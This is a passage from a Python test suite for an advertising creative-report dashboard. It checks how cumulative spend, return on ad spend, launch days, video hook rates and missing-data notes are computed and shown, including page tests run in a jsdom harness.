        self.assertEqual(daily[("2026-03-03", "cpa")]["value_note"], "n/a (no data this day)")

    def test_an_account_with_no_purchase_value_has_no_running_return_not_zero(self):
        rows = [{"date": d, "ad_id": a, "spend": 100.0, "conversions": None, "conversion_value": None}
                for d in ("2026-03-01", "2026-03-02", "2026-03-03") for a in ("1", "2")]
        cumulative = dashboard.cumulative_rows(type("Ctx", (), {"rows": rows})())
        self.assertEqual(len(cumulative), 3)
        for r in cumulative:
            for field in ("value", "cum_value", "cum_roas"):
                self.assertIsNone(r[field], field)
                self.assertEqual(r[field + "_note"], "n/a (missing purchase value)")
            self.assertEqual(r["basis_note"], dashboard.NO_VALUE)
            self.assertIsNone(r["cum_spend"])
            self.assertEqual(r["cum_spend_note"], "n/a (missing purchase value)")
        self.assertEqual(dashboard.validate_rows("cumulative", cumulative, dashboard.load_schema()), [])

    def test_purchases_with_no_value_anywhere_give_the_missing_value_reason_not_the_share_of_spend_one(self):
        rows = [{"date": d, "ad_id": "1", "spend": 100.0, "conversions": 2.0, "conversion_value": None} for d in ("2026-03-01", "2026-03-02")]
        cumulative = dashboard.cumulative_rows(type("Ctx", (), {"rows": rows})())
        for r in cumulative:
            for field in ("value", "cum_value", "cum_roas", "cum_spend"):
                self.assertIsNone(r[field], field)
                self.assertEqual(r[field + "_note"], "n/a (missing purchase value)")
            self.assertEqual(r["basis_note"], dashboard.NO_VALUE)

    def test_a_day_whose_rows_record_nothing_has_no_value_even_when_the_account_records_values(self):
        rows = [{"date": "2026-03-01", "ad_id": "1", "spend": 100.0, "conversions": 1.0, "conversion_value": 300.0},
                {"date": "2026-03-02", "ad_id": "1", "spend": None, "conversions": None, "conversion_value": None},
                {"date": "2026-03-03", "ad_id": "1", "spend": 100.0, "conversions": 0.0, "conversion_value": None}]
        cumulative = dashboard.cumulative_rows(type("Ctx", (), {"rows": rows})())
        self.assertEqual([r["value"] for r in cumulative], [300.0, None, 0.0])
        self.assertEqual(cumulative[1]["value_note"], "n/a (missing purchase value)")
        self.assertEqual([r["cum_value"] for r in cumulative], [300.0, 300.0, 300.0])

    def test_once_the_account_records_a_purchase_value_a_day_with_no_purchases_is_a_real_zero(self):
        rows = [{"date": "2026-03-01", "ad_id": "1", "spend": 100.0, "conversions": None, "conversion_value": None},
                {"date": "2026-03-02", "ad_id": "1", "spend": 100.0, "conversions": 1.0, "conversion_value": 300.0},
                {"date": "2026-03-03", "ad_id": "1", "spend": 100.0, "conversions": None, "conversion_value": None}]
        cumulative = dashboard.cumulative_rows(type("Ctx", (), {"rows": rows})())
        self.assertEqual([r["value"] for r in cumulative], [0.0, 300.0, 0.0])
        self.assertEqual([r["cum_value"] for r in cumulative], [0.0, 300.0, 300.0])
        self.assertEqual([r["cum_roas"] for r in cumulative], [0.0, 1.5, 1.0])
        self.assertTrue(all(r["basis_note"].startswith("Nothing left out") for r in cumulative))

    def test_unvalued_ad_days_under_the_method_setting_leave_both_running_sums_and_say_how_many(self):
        rows = [{"date": "2026-03-01", "ad_id": "1", "spend": 100.0, "conversions": 2.0, "conversion_value": 300.0},
                {"date": "2026-03-02", "ad_id": "1", "spend": 100.0, "conversions": 1.0, "conversion_value": 150.0},
                {"date": "2026-03-02", "ad_id": "2", "spend": 4.0, "conversions": 1.0, "conversion_value": None},
                {"date": "2026-03-03", "ad_id": "1", "spend": 100.0, "conversions": 1.0, "conversion_value": 150.0}]
        cumulative = dashboard.cumulative_rows(type("Ctx", (), {"rows": rows})())
        self.assertEqual([r["cum_spend"] for r in cumulative], [100.0, 200.0, 300.0])
        self.assertEqual([r["cum_value"] for r in cumulative], [300.0, 450.0, 600.0])
        self.assertEqual([r["cum_roas"] for r in cumulative], [3.0, 2.25, 2.0])
        self.assertEqual([r["spend"] for r in cumulative], [100.0, 104.0, 100.0])
        self.assertEqual([r["basis_note"] for r in cumulative], [
            "Nothing left out: every ad-day with purchases has a recorded purchase value.",
            "1 ad-day with purchases but no recorded value is left out (2.0% of spend).",
            "1 ad-day with purchases but no recorded value is left out (1.3% of spend)."])
        self.assertEqual(dashboard.validate_rows("cumulative", cumulative, dashboard.load_schema()), [])

    def test_a_day_with_no_purchases_and_a_blank_value_counts_as_zero_and_keeps_the_running_value(self):
        rows = [dict(r) for r in self.rows]
        quiet = sorted({r["date"] for r in rows})[4]
        for r in rows:
            if r["date"] == quiet:
                r.update(conversions=0, conversion_value=None)
        cumulative = self.build(rows)["cumulative"]
        at = next(i for i, r in enumerate(cumulative) if r["day"] == quiet)
        self.assertEqual(cumulative[at]["value"], 0)
        self.assertEqual(cumulative[at]["cum_value"], cumulative[at - 1]["cum_value"])
        self.assertTrue(all(r["cum_value"] is not None and r["cum_roas"] is not None for r in cumulative))

    def test_the_overview_return_on_spend_agrees_with_the_running_total_at_the_end(self):
        rows = [dict(r) for r in self.rows]
        quiet = sorted({r["date"] for r in rows})[4]
        for r in rows:
            if r["date"] == quiet:
                r.update(conversions=0, conversion_value=None)
        found = self.build(rows)
        roas = next(r for r in found["kpis"] if r["metric"] == "roas")["value"]
        self.assertAlmostEqual(found["cumulative"][-1]["cum_roas"], roas, places=4)

    def test_only_ads_launched_inside_the_window_shape_the_day_since_launch_band(self):
        found = self.build(self.rows)
        first = min(r["date"] for r in self.rows)
        starts = {}
        for r in self.rows:
            if (r.get("impressions") or 0) > 0:
                starts[r["ad_id"]] = min(starts.get(r["ad_id"], r["date"]), r["date"])
        launched = {ad for ad, start in starts.items() if start > first}
        self.assertEqual((len(launched), len(starts)), (14, 30))
        media = {r["ad_id"]: r for r in found["ad-media"]}
        self.assertEqual({ad for ad, r in media.items() if r["launch_day"]}, launched)
        for ad, r in media.items():
            if ad not in launched:
                self.assertEqual(r["launch_day_note"], "n/a (running before the window began; its launch day is not in the data)")
        self.assertLessEqual(max(r["ads"] for r in found["age-curve"]), len(launched))
        fact = next(r for r in found["header"] if r["fact"] == "Launched in the window")["value"]
        self.assertTrue(fact.startswith("14 of 30 ads"), fact)

    def test_an_ad_is_compared_with_the_other_ads_of_its_format_never_with_itself(self):
        _, ctx = report.build_report(rows=self.rows, verdicts=self.verdicts, currency="USD", generated="2026-01-02")
        rows = dashboard.build_datasets(ctx)[0]["ad-metrics"]
        whole = cm.baseline(ctx.ads, "ctr", group_by=("format",))
        checked = 0
        for r in rows:
            ad = ctx.ad_index.get(r["ad_id"])
            stats = whole["groups"].get(str(ad.get("format")))
            if r["metric"] != "ctr" or not stats or stats.get("basis") != "group" or not r["group"].startswith("the other "):
                continue
            n = int(r["group"].split()[2])
            self.assertEqual(n, stats["n_group"] - 1, r)
            checked += 1
        self.assertGreater(checked, 0)

    def test_the_payback_metric_breaks_a_tie_by_spend_then_by_name(self):
        def ctx(records):
            return type("Ctx", (), {"records": records})()
        by_spend = [{"objective": "OUTCOME_AWARENESS", "spend": 10.0}, {"objective": "OUTCOME_AWARENESS", "spend": 10.0},
                    {"objective": "OUTCOME_TRAFFIC", "spend": 30.0}, {"objective": "OUTCOME_TRAFFIC", "spend": 30.0}]
        self.assertEqual(dashboard.payback_metric(ctx(by_spend))[0], "cpc")
        by_name = [{"objective": "OUTCOME_TRAFFIC", "spend": 10.0}, {"objective": "OUTCOME_TRAFFIC", "spend": 10.0},
                   {"objective": "OUTCOME_AWARENESS", "spend": 10.0}, {"objective": "OUTCOME_AWARENESS", "spend": 10.0}]
        self.assertEqual(dashboard.payback_metric(ctx(by_name))[0], "cpm")

    def test_when_even_the_rows_without_images_pass_the_limit_every_thumbnail_goes_with_the_budget_reason(self):
        _, ctx = report.build_report(rows=self.rows, verdicts=self.verdicts, currency="USD", generated="2026-01-02",
                                     previews=Previews(str(EXAMPLE / "previews")))
        with mock.patch.object(dashboard, "DATASET_MAX", 1024):
            media = dashboard.build_datasets(ctx)[0]["ad-media"]
        self.assertTrue(media)
        for r in media:
            self.assertIsNone(r["thumb"])
            self.assertEqual(r["thumb_note"], dashboard.THUMB_REASONS["size budget reached"])

    def test_a_delivery_day_with_too_few_ads_has_no_band_and_says_why(self):
        late = sorted({r["date"] for r in self.rows})[9:]
        keep = {"120000000001", "120000000002"}
        rows = [r for r in self.rows if r["ad_id"] in keep or r["date"] not in late]
        curve = self.build(rows)["age-curve"]
        thin = [r for r in curve if r["ads"] < dashboard.CURVE_MIN_ADS]
        self.assertTrue(thin)
        for r in thin:
            self.assertEqual((r["median"], r["p25"], r["p75"]), (None, None, None))
            self.assertEqual(r["median_note"], "n/a (fewer than %d ads launched in the window had a value on delivery day %d)" % (dashboard.CURVE_MIN_ADS, r["delivery_day"]))
        self.assertTrue(all(r["median"] is not None for r in curve if r["ads"] >= dashboard.CURVE_MIN_ADS))

    def test_a_day_an_ad_did_not_deliver_is_null_with_its_reason_not_zero(self):
        rows = [dict(r) for r in self.rows]
        target = next(r for r in rows if r["ad_id"] == "120000000001")
        target.update(impressions=0)
        daily = self.build(rows)["ad-daily"]
        row = next(r for r in daily if r["ad_id"] == "120000000001" and r["day"] == target["date"])
        self.assertIsNone(row["delivery_day"])
        for metric in dashboard.SERIES_METRICS:
            self.assertIsNone(row[metric])
            self.assertEqual(row[metric + "_note"], dashboard.NO_DELIVERY)

    def test_every_new_dataset_passes_the_schema_including_null_with_its_note(self):
        found = self.build(self.rows)
        schema = dashboard.load_schema()
        for dataset_id in ("ad-media", "ad-daily", "ad-metrics", "age-curve", "share-daily", "cumulative", "verdict-board", "daily"):
            self.assertTrue(found[dataset_id], dataset_id)
            self.assertEqual(dashboard.validate_rows(dataset_id, found[dataset_id], schema), [], dataset_id)

    def test_each_days_shares_add_up_to_the_whole_day(self):
        share = self.build(self.rows)["share-daily"]
        for dimension in ("format", "verdict"):
            for day in {r["day"] for r in share if r["dimension"] == dimension}:
                total = sum(r["share_pct"] for r in share if r["dimension"] == dimension and r["day"] == day)
                self.assertAlmostEqual(total, 100.0, places=3)


    def launched_inside(self):
        first = min(r["date"] for r in self.rows)
        starts = {}
        for r in self.rows:
            if (r.get("impressions") or 0) > 0:
                starts[r["ad_id"]] = min(starts.get(r["ad_id"], r["date"]), r["date"])
        ad = sorted(a for a, start in starts.items() if start > first)[0]
        return first, ad, starts[ad]

    def test_an_ad_with_a_row_on_the_windows_first_day_was_running_before_it_even_without_impressions(self):
        first, ad, start = self.launched_inside()
        media = {r["ad_id"]: r for r in self.build(self.rows)["ad-media"]}
        self.assertEqual(media[ad]["launch_day"], start)
        name = next(r["ad_name"] for r in self.rows if r["ad_id"] == ad)
        quiet = {"date": first, "ad_id": ad, "ad_name": name, "spend": 0.0, "impressions": 0.0, "reach": 0.0, "link_clicks": 0.0,
                 "clicks": 0.0, "add_to_carts": 0.0, "conversions": 0.0, "conversion_value": 0.0, "conversions_source": "Purchases"}
        found = self.build([dict(r) for r in self.rows] + [quiet])
        media = {r["ad_id"]: r for r in found["ad-media"]}
        self.assertIsNone(media[ad]["launch_day"])
        self.assertEqual(media[ad]["launch_day_note"], dashboard.BEFORE_WINDOW)
        self.assertEqual(dashboard.validate_rows("ad-media", found["ad-media"], dashboard.load_schema()), [])

    def test_an_ad_created_before_the_window_was_running_before_it_and_one_created_on_its_first_day_launched_in_it(self):
        first, ad, start = self.launched_inside()
        day = dt.date.fromisoformat(first)
        for created, launched in (((day - dt.timedelta(days=3)).isoformat() + "T09:00:00+0000", None), (first + "T00:00:00+0000", start)):
            rows = [dict(r, created_time=created) if r["ad_id"] == ad else dict(r) for r in self.rows]
            media = {r["ad_id"]: r for r in self.build(rows)["ad-media"]}
            self.assertEqual(media[ad]["launch_day"], launched, created)
            self.assertEqual(media[ad]["launch_day_note"], None if launched else dashboard.BEFORE_WINDOW, created)

    def test_one_unvalued_row_over_the_setting_stops_the_day_even_when_another_row_has_a_value(self):
        rows = [{"date": "2026-03-01", "ad_id": "1", "spend": 20.0, "conversions": 5.0, "conversion_value": None},
                {"date": "2026-03-01", "ad_id": "2", "spend": 20.0, "conversions": 2.0, "conversion_value": 100.0},
                {"date": "2026-03-02", "ad_id": "2", "spend": 10.0, "conversions": 1.0, "conversion_value": 50.0}]
        cumulative = dashboard.cumulative_rows(type("Ctx", (), {"rows": rows})())
        reason = "n/a (ad-days with purchases but no recorded value hold 40.0% of spend, over the 5% this report allows; the first is on 2026-03-01)"
        for r in cumulative:
            self.assertIsNone(r["cum_value"])
            self.assertIsNone(r["cum_roas"])
            self.assertEqual(r["cum_value_note"], reason)
            self.assertEqual(r["cum_roas_note"], reason)
        self.assertEqual([r["value"] for r in cumulative], [100.0, 50.0])
        self.assertEqual(dashboard.validate_rows("cumulative", cumulative, dashboard.load_schema()), [])

    def test_a_blank_purchase_count_is_no_purchases_so_the_running_value_carries_on(self):
        rows = [dict(r) for r in self.rows]
        gap = sorted({r["date"] for r in rows})[4]
        for r in rows:
            if r["date"] == gap:
                r.update(conversions=None, conversion_value=None)
        cumulative = self.build(rows)["cumulative"]
        at = next(i for i, r in enumerate(cumulative) if r["day"] == gap)
        self.assertEqual(cumulative[at]["value"], 0)
        self.assertEqual(cumulative[at]["cum_value"], cumulative[at - 1]["cum_value"])
        self.assertTrue(all(r["cum_roas"] is not None for r in cumulative))
        self.assertTrue(all(r["basis_note"].startswith("Nothing left out") for r in cumulative))
        self.assertEqual(dashboard.validate_rows("cumulative", cumulative, dashboard.load_schema()), [])

    def test_daily_rates_share_the_key_numbers_basis_when_a_row_has_spend_and_a_blank_purchase_count(self):
        rows = [dict(r) for r in self.rows]
        for r in rows:
            if not r.get("conversions"):
                r.update(conversions=None, conversion_value=None)
        found = self.build(rows)
        tile = {r["metric"]: r["value"] for r in found["kpis"]}
        days = {}
        for r in found["daily"]:
            days.setdefault(r["day"], {})[r["metric"]] = r["value"]
        spend = {day: sum(r["spend"] for r in rows if r["date"] == day and r.get("spend") is not None) for day in days}
        checked = 0
        for day, values in days.items():
            if values.get("cpa") is not None:
                self.assertAlmostEqual(values["cpa"] * values["conversions"], spend[day], places=2, msg=day)
                self.assertAlmostEqual(values["roas"] * spend[day], values["conversion_value"], places=2, msg=day)
                checked += 1
        self.assertGreater(checked, 0)
        self.assertAlmostEqual(sum(spend.values()) / sum(v["conversions"] or 0 for v in days.values()), tile["cpa"], places=4)
        self.assertAlmostEqual(sum(v["roas"] * spend[d] for d, v in days.items() if v.get("roas") is not None) / sum(spend.values()), tile["roas"], places=4)
        for day, values in days.items():
            video = [r for r in rows if r["date"] == day and r.get("video_views_3s") is not None]
            if values.get("hook_rate") is not None:
                self.assertAlmostEqual(values["hook_rate"], 100 * sum(r["video_views_3s"] for r in video) / sum(r["impressions"] for r in video), places=4)
            day_rows = [r for r in rows if r["date"] == day]
            self.assertAlmostEqual(values["cpm"], 1000 * spend[day] / sum(r["impressions"] for r in day_rows), places=4)

    def test_a_short_label_drops_the_long_ad_id_and_the_id_tail_but_keeps_other_numbers(self):
        self.assertEqual(dashboard.short_label("summer \u00b7 house \u00b7 static \u00b7 120211234567890"), "summer \u00b7 house \u00b7 static")
        self.assertEqual(dashboard.short_label("summer \u00b7 house \u00b7 static \u00b7 \u20264821"), "summer \u00b7 house \u00b7 static")
        self.assertEqual(dashboard.short_label("spring 2026 \u00b7 static \u00b7 v12"), "spring 2026 \u00b7 static \u00b7 v12")
        self.assertEqual(dashboard.short_label("120211234567890"), "120211234567890")
        found = self.build(self.rows)
        for name in ("pareto", "verdicts", "ad-media"):
            for r in found[name]:
                self.assertEqual(r["short_label"], dashboard.short_label(r["label"]), name)

    def test_an_ad_under_a_thousand_impressions_is_low_delivery_and_one_without_impressions_says_why(self):
        rows = [dict(r) for r in self.rows]
        low, blank = sorted({r["ad_id"] for r in rows})[:2]
        for r in rows:
            if r["ad_id"] == low:
                r["impressions"] = 20
            if r["ad_id"] == blank:
                r["impressions"] = None
        media = {r["ad_id"]: r for r in self.build(rows)["ad-media"]}
        self.assertIs(media[low]["low_delivery"], True)
        self.assertIsNone(media[low]["low_delivery_note"])
        self.assertIsNone(media[blank]["low_delivery"])
        self.assertEqual(media[blank]["low_delivery_note"], "n/a (no impressions recorded for this ad)")
        others = [r for ad, r in media.items() if ad not in (low, blank)]
        self.assertTrue(others and all(r["low_delivery"] is False for r in others))

    def test_a_static_ad_has_no_hook_rate_because_it_is_not_a_video_and_a_video_ad_without_plays_says_otherwise(self):
        _, ctx = report.build_report(rows=self.rows, verdicts=self.verdicts, currency="USD", generated="2026-01-02")
        static = next(str(a["ad_id"]) for a in ctx.ads if ctx.format_name(a.get("format")) == "Static")
        video = next(str(a["ad_id"]) for a in ctx.ads if ctx.format_name(a.get("format")) == "UGC video")
        rows = [dict(r, video_views_3s=None, video_thruplay=None) if r["ad_id"] == video else dict(r) for r in self.rows]
        found = self.build(rows)
        for name in ("verdicts",):
            by = {r["ad_id"]: r for r in found[name]}
            self.assertEqual(by[static]["hook_rate_note"], dashboard.NOT_VIDEO)
            self.assertIsNone(by[video]["hook_rate"])
            self.assertNotEqual(by[video]["hook_rate_note"], dashboard.NOT_VIDEO)
        metrics = {(r["ad_id"], r["metric"]): r for r in found["ad-metrics"]}
        self.assertEqual(metrics[(static, "hook_rate")]["value_note"], dashboard.NOT_VIDEO)
        self.assertNotEqual(metrics[(video, "hook_rate")]["value_note"], dashboard.NOT_VIDEO)

    def test_an_ad_with_no_plays_and_no_format_is_not_called_not_a_video(self):
        _, ctx = report.build_report(rows=self.rows, verdicts=self.verdicts, currency="USD", generated="2026-01-02")
        static = next(str(a["ad_id"]) for a in ctx.ads if ctx.format_name(a.get("format")) == "Static")
        rows = [dict(r, ad_name="mystery") if r["ad_id"] == static else dict(r) for r in self.rows]
        found = self.build(rows)
        self.assertEqual({r["ad_id"]: r for r in found["verdicts"]}[static]["hook_rate_note"], dashboard.FORMAT_NOT_KNOWN)
        self.assertEqual({(r["ad_id"], r["metric"]): r for r in found["ad-metrics"]}[(static, "hook_rate")]["value_note"], dashboard.FORMAT_NOT_KNOWN)
        days = [r for r in found["ad-daily"] if r["ad_id"] == static and r["hook_rate"] is None and r["delivery_day"]]
        self.assertTrue(days and all(r["hook_rate_note"] == dashboard.FORMAT_NOT_KNOWN for r in days))
        self.assertIn(dashboard.FORMAT_NOT_KNOWN, (ROOT / "skills/creative-report/assets/claude-dashboard/dashboard.js").read_text())

    def test_a_recorded_zero_plays_does_not_make_an_ad_of_unknown_format_a_non_video(self):
        self.assertIsNone(dashboard._video_flag({"video_views_3s": 0, "format": ""}))
        self.assertIsNone(dashboard._video_flag({"video_views_3s": 0, "format": "unknown"}))
        self.assertIs(dashboard._video_flag({"video_views_3s": 0, "format": "static image"}), False)
        self.assertIs(dashboard._video_flag({"video_views_3s": 7, "format": ""}), True)

    def test_an_ad_with_no_plays_and_no_format_is_not_known_to_be_a_video(self):
        _, ctx = report.build_report(rows=self.rows, verdicts=self.verdicts, currency="USD", generated="2026-01-02")
        static = next(str(a["ad_id"]) for a in ctx.ads if ctx.format_name(a.get("format")) == "Static")
        video = next(str(a["ad_id"]) for a in ctx.ads if ctx.format_name(a.get("format")) == "UGC video")
        rows = [dict(r, ad_name="mystery", video_views_3s=None, video_thruplay=None) if r["ad_id"] == static else dict(r) for r in self.rows]
        media = {r["ad_id"]: r for r in self.build(rows)["ad-media"]}
        self.assertIsNone(media[static]["is_video"])
        self.assertEqual(media[static]["is_video_note"], dashboard.FORMAT_NOT_KNOWN)
        self.assertIs(media[video]["is_video"], True)
        self.assertIsNone(media[video]["is_video_note"])

    def test_the_pareto_cut_counts_every_ad_and_the_ads_with_no_spend_it_leaves_unranked(self):
        rows = [dict(r) for r in self.rows]
        idle = sorted({r["ad_id"] for r in rows})[0]
        for r in rows:
            if r["ad_id"] == idle:
                r["spend"] = 0.0
        found = self.build(rows)
        cut = found["pareto-cut"][0]
        self.assertEqual((cut["all_ads"], cut["no_spend_ads"], cut["ads"]), (30, 1, 29))
        self.assertNotIn(idle, {r["ad_id"] for r in found["pareto"]})

    def test_without_a_mix_file_the_scorecard_and_grid_facts_say_so(self):
        facts = {r["fact"]: r["value"] for r in self.build(self.rows)["header"]}
        self.assertEqual(facts["Formats not scored"], "n/a (no format scorecard in this run)")
        self.assertEqual(facts["Concepts shown"], "n/a (no concept grid in this run)")


PAGE_TOOLS_WHY = "set CR_JSDOM (a jsdom install) and CR_D3 (d3.min.js, v7) and have node to run the page in a DOM"


def needs_dom(cls):
    """Page tests run with node, jsdom and d3; without them they skip, unless CR_REQUIRE_PAGE_TESTS=1 (CI), where they fail."""
    if shutil.which("node") and os.environ.get("CR_JSDOM") and os.environ.get("CR_D3"):
        return cls
    if os.environ.get("CR_REQUIRE_PAGE_TESTS") == "1":
        cls.setUp = lambda self: self.fail("CR_REQUIRE_PAGE_TESTS=1 but the page tools are missing: " + PAGE_TOOLS_WHY)
        return cls
    return unittest.skip(PAGE_TOOLS_WHY)(cls)


@needs_dom
class PageInADomTest(unittest.TestCase):
    """The page itself, run against the committed Acme bundle and a mix-only one with a stub of the host's dash object."""

    HARNESS = ROOT / "tests" / "page_harness.js"
    EXAMPLE_BUNDLE = EXAMPLE / "claude-dashboard"

    def run_page(self, bundle, status, selectors):
        done = subprocess.run(["node", str(self.HARNESS), str(bundle), status, json.dumps(selectors)], capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stderr)
        found = json.loads(done.stdout)
        self.assertEqual(found["errors"], [])
        return found["probe"]

    def test_each_status_gets_its_own_line_on_every_kind_of_mark(self):
        words = {"error": "Failed to load", "connect": "Could not connect to the data", "declined": "Access to the data was declined",
                 "missing": "The data source is missing"}
        for status, message in words.items():
            probe = self.run_page(self.EXAMPLE_BUNDLE, status, ["#title", ".cr-kpi-value", "#verdict-table tbody", "#pareto-table tbody", "#concentration-note"])
            for selector, found in probe.items():
                self.assertIn(message, found["text"], (status, selector))
            self.assertNotIn("Failed to load", probe["#title"]["text"] if status != "error" else "")

    def test_the_loaded_page_fills_its_marks_and_hides_the_empty_state_holders(self):
        probe = self.run_page(self.EXAMPLE_BUNDLE, "ok", ["#title", "#kpis", "#kpis-empty", "#all-ads-empty", "#verdict-table tbody tr"])
        self.assertIn("Acme", probe["#title"]["text"])
        self.assertFalse(probe["#kpis"]["hidden"])
        self.assertTrue(probe["#kpis-empty"]["hidden"])
        self.assertGreater(probe["#verdict-table tbody tr"]["count"], 1)

    def test_a_mix_only_page_shows_why_there_are_no_key_numbers_or_ads_and_hides_the_empty_tiles_and_table(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = build_mix_only(tmp, Path(tmp) / "bundle")
            probe = self.run_page(out, "ok", ["#kpis", "#kpis-empty", "#kpis-how", "#all-ads-empty", "#all-ads-how", "#verdict-table", "#images-note"])
        self.assertTrue(probe["#kpis"]["hidden"])
        self.assertTrue(probe["#verdict-table"]["hidden"])
        for holder in ("#kpis-empty", "#kpis-how", "#all-ads-empty", "#all-ads-how"):
            # the Ads page is not the one showing, so its holders are judged by their own attribute
            self.assertFalse(probe[holder]["hidden" if holder.startswith("#kpis") else "own_hidden"], holder)
            self.assertNotEqual(probe[holder]["text"], "—", holder)
        self.assertTrue(probe["#images-note"]["hidden"])

    def test_without_ad_data_the_takeaway_and_the_pareto_lead_give_the_reason_not_a_bare_dash(self):
        selectors = ["#takeaway", "#pareto-lead"]
        with tempfile.TemporaryDirectory() as tmp:
            mix = build_mix_only(tmp, Path(tmp) / "mix")
            verdicts = Path(tmp) / "verdicts.json"
            verdicts.write_text(json.dumps(run_json("keep-or-kill", "verdicts.py")))
            self.assertEqual(report.main(["--verdicts", str(verdicts), "-o", str(Path(tmp) / "v.html"), "--claude-dashboard", str(Path(tmp) / "v")]), 0)
            for bundle in (mix, Path(tmp) / "v"):
                probe = self.run_page(bundle, "ok", selectors)
                for selector in selectors:
                    self.assertGreater(len(probe[selector]["text"]), 3, (bundle.name, selector))
                    self.assertNotEqual(probe[selector]["text"], "\u2014", (bundle.name, selector))
        probe = self.run_page(self.EXAMPLE_BUNDLE, "ok", selectors)
        self.assertNotIn("n/a", probe["#takeaway"]["text"])


    def test_a_narrow_range_labels_the_whole_window_numbers_and_the_label_goes_when_cleared(self):
        selectors = ["[data-whole]", "[data-range-note]"]
        steps = [{"start": "2026-03-05", "end": "2026-03-20"}, {"start": None, "end": None}]
        done = subprocess.run(["node", str(self.HARNESS), str(self.EXAMPLE_BUNDLE), "ok", json.dumps(selectors), json.dumps(steps)],
                              capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stderr)
        found = json.loads(done.stdout)
        self.assertEqual(found["errors"], [])
        before, narrow, cleared = found["probe"], found["steps"][0], found["steps"][1]
        for probe in (before, cleared):
            self.assertTrue(probe["[data-whole]"]["hidden"])
            self.assertNotIn("not the selected range", probe["[data-whole]"]["text"])
            self.assertNotIn("Showing", probe["[data-range-note]"]["text"])
        self.assertGreaterEqual(narrow["[data-whole]"]["count"], 6)
        self.assertEqual(narrow["[data-whole]"]["text"].count("not the selected range"), narrow["[data-whole]"]["count"])
        self.assertIn("Showing 5 Mar 2026 to 20 Mar 2026.", narrow["[data-range-note]"]["text"])

    def run_steps(self, bundle, selectors, steps):
        done = subprocess.run(["node", str(self.HARNESS), str(bundle), "ok", json.dumps(selectors), json.dumps(steps)], capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stderr)
        found = json.loads(done.stdout)
        self.assertEqual(found["errors"], [])
        return found["steps"]

    def test_bad_range_params_swap_clamp_or_fall_back_to_the_window(self):
        steps = [{"start": "2026-03-20", "end": "2026-03-05"}, {"start": "March 5", "end": "2026-03-20"},
                 {"start": "2026-02-01", "end": "2026-04-30"}, {"start": "2026-03-07", "end": "2026-02-03"}]
        found = [p["[data-range-note]"]["text"].split(" | ")[0] for p in self.run_steps(self.EXAMPLE_BUNDLE, ["[data-range-note]"], steps)]
        self.assertEqual(found, ["Showing 5 Mar 2026 to 20 Mar 2026.", "Showing 1 Mar 2026 to 20 Mar 2026.", "Whole window.",
                                 "Showing 1 Mar 2026 to 7 Mar 2026."])

    def test_a_range_with_no_values_says_so_instead_of_a_blank_chart(self):
        with tempfile.TemporaryDirectory() as tmp:
            bundle = Path(tmp) / "b"
            shutil.copytree(self.EXAMPLE_BUNDLE, bundle)
            target = bundle / "datasets" / "daily.json"
            rows = json.loads(target.read_text())
            for r in rows:
                if "2026-03-10" <= r["day"] <= "2026-03-12":
                    r.update(value=None, value_note="n/a (no data this day)")
            target.write_text(json.dumps(rows))
            probe = self.run_steps(bundle, ["#time-chart .cr-empty", "#time-chart svg"], [{"start": "2026-03-10", "end": "2026-03-12"}])[0]
        self.assertEqual(probe["#time-chart .cr-empty"]["text"], "n/a: no data between 10 Mar 2026 and 12 Mar 2026")
        self.assertEqual(probe["#time-chart svg"]["count"], 0)

    def test_the_pareto_table_shows_its_first_ranked_ads_and_a_show_all_button(self):
        probe = self.run_steps(self.EXAMPLE_BUNDLE, ["#pareto-table tbody tr", "#pareto-more"], [{"click": "a[data-page=pareto]"}])[0]
        self.assertEqual(probe["#pareto-table tbody tr"]["count"], 13)
        self.assertFalse(probe["#pareto-more"]["hidden"])

    def test_a_format_with_no_roas_says_why_in_the_scorecard(self):
        with tempfile.TemporaryDirectory() as tmp:
            bundle = Path(tmp) / "b"
            shutil.copytree(self.EXAMPLE_BUNDLE, bundle)
            target = bundle / "datasets" / "formats.json"
            rows = json.loads(target.read_text())
            rows[0].update(roas=None, roas_note="n/a (missing purchase value)", roas_grade=None)
            target.write_text(json.dumps(rows))
            probe = self.run_steps(bundle, ["#format-chart .cr-na"], [{"click": "a[data-page=mix]"}])[0]
        self.assertEqual(probe["#format-chart .cr-na"]["count"], 1)
        self.assertIn("missing purchase value", probe["#format-chart .cr-na"]["text"])

    def test_with_no_purchase_value_the_spend_and_value_view_gives_the_reason_and_draws_no_line(self):
        with tempfile.TemporaryDirectory() as tmp:
            bundle = Path(tmp) / "b"
            shutil.copytree(self.EXAMPLE_BUNDLE, bundle)
            target = bundle / "datasets" / "cumulative.json"
            rows = json.loads(target.read_text())
            for r in rows:
                r.update(cum_spend=None, cum_spend_note="n/a (missing purchase value)", value=None, value_note="n/a (missing purchase value)",
                         cum_value=None, cum_value_note="n/a (missing purchase value)", cum_roas=None, cum_roas_note="n/a (missing purchase value)")
            target.write_text(json.dumps(rows))
            probe = self.run_steps(bundle, ["#cumulative-chart .cr-empty", "#cumulative-chart > svg"],
                                   [{"click": "a[data-page=trends]"}, {"click": "#cumulative-switch [data-cumulative=sums]"}])[1]
        self.assertIn("missing purchase value", probe["#cumulative-chart .cr-empty"]["text"])
        self.assertEqual(probe["#cumulative-chart > svg"]["count"], 0)

    def test_the_spend_line_says_it_counts_only_ad_days_with_a_readable_return(self):
        probe = self.run_steps(self.EXAMPLE_BUNDLE, ["#cumulative-chart .cr-legend"],
                               [{"click": "a[data-page=trends]"}, {"click": "#cumulative-switch [data-cumulative=sums]"}])[1]
        self.assertIn("Spend on ad-days with a readable return", probe["#cumulative-chart .cr-legend"]["text"])
        self.assertNotIn("Spend so far", probe["#cumulative-chart .cr-legend"]["text"])

    def test_an_ad_running_before_the_window_says_its_days_count_from_the_window_and_a_launched_one_does_not(self):
        media = rows_of(self.EXAMPLE_BUNDLE, "ad-media")
        before = next(r["ad_id"] for r in media if not r["launch_day"])
        launched = next(r["ad_id"] for r in media if r["launch_day"])
        steps = self.run_steps(self.EXAMPLE_BUNDLE, ["#ad-launch", "#fatigue-launched"], [{"ad": before}, {"ad": launched}])
        self.assertFalse(steps[0]["#ad-launch"]["own_hidden"])
        self.assertIn("running before the window began; its launch day is not in the data", steps[0]["#ad-launch"]["text"])
        self.assertTrue(steps[1]["#ad-launch"]["own_hidden"])
        self.assertTrue(steps[0]["#fatigue-launched"]["text"].startswith("14 of 30 ads"))

    def test_the_spend_strip_shows_the_datasets_peak_day_whatever_the_range(self):
